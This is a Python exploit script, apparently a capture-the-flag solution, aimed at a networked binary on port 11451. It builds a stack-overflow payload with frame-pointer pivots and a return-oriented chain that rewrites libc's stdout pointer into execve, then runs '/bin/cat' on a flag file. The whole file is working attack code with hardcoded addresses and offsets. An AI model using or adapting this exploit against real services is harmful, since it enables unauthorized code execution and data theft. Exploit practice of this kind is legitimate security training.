from struct import *
from sys import path, argv
from time import *
from ctypes import *
from struct import *
from socket import *

def read_until(p, s):
    ret = ""
    while 1:
        c = p.recv(1)
        ret += c
        if ret.endswith(s):
            return ret

p = socket(AF_INET, SOCK_STREAM)
print("connecting")

if len(argv) >= 2:
  p.connect(("", 11451))
else :
  p.connect(("localhost", 11451))
print("connected")

PRINTF_GOT = 0x601fa8
STDOUT_BSS = 0x602020
STDOUT_OFF = 0x1ec6a0
EXECVE_OFF = 0xe62f0
ADDR_DIFF = STDOUT_OFF - EXECVE_OFF
assert ADDR_DIFF > 0
assert not b'\n' in pack('<Q', ADDR_DIFF)

CMD = b'/bin/cat\x00'
FLAG_PATH = b'/home/carot/flag.txt\x00'

TMPBUF_ADDR = 0x602800
CAT_ADDR = TMPBUF_ADDR
FLAG_ADDR = CAT_ADDR + len(CMD)
ARGV_ADDR = FLAG_ADDR + len(FLAG_PATH)
DIFF_ADDR = ARGV_ADDR + 8 * 3

payload = b'\x00' * 0x210
payload += pack('<Q', TMPBUF_ADDR+0x210 - 1) # rbp
payload += pack('<Q', 0x400e56) # scanf
payload += b'a' * 0x260

payload += pack('<Q', DIFF_ADDR + 0x8) # rbp
payload += pack('<Q', 0x400fd7) # rax = diff
payload += b'a' * 0x260

payload += pack('<Q', STDOUT_BSS + 0x10) # rbp
payload += pack('<Q', 0x400d96) # sub
payload += b'a' * 0x260

payload += pack('<Q', 0xdeadbeef) # rbp
payload += pack('<Q', 0x4010ca) 
payload += pack('<Q', 0) # rbx
payload += pack('<Q', 0xdeadbeef) # rbp
payload += pack('<Q', STDOUT_BSS) # r12
payload += pack('<Q', CAT_ADDR) # r13
payload += pack('<Q', ARGV_ADDR) # r14
payload += pack('<Q', 0) # r15

payload += pack('<Q', 0x4010b0) # execve

assert not b'\n' in payload
payload += b'\n'

payload += b'\x00'
payload += CMD
payload += FLAG_PATH
payload += pack('<Q', CAT_ADDR)
payload += pack('<Q', FLAG_ADDR)
payload += pack('<Q', 0)
payload += pack('<Q', ADDR_DIFF)
payload += b'\n\n'

print(len(payload))
assert len(payload) <= 4096

p.sendall(payload)

print(p.recv(1024))
print(p.recv(1024))
print(p.recv(1024))
print(p.recv(1024))
print(p.recv(1024))
print(p.recv(1024))
